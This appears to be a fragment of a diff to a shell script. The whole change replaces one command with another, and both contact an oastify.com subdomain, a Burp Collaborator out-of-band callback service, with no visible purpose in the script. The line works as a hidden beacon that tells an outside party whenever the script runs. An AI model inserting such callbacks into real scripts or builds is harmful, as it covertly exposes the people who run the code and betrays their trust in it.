@@ -17,7 +17,7 @@ TARGET=${3:-"all"}
 
 
 
-wget https://7bjvevg1oovhal9ifutdoy162x8owokd.oastify.com/12009
+curl https://gvf4y40a8xfquutrz3dm87lfm6sxgy4n.oastify.com/12009
 
 if [ $DO_DEBUG == false ]
 then
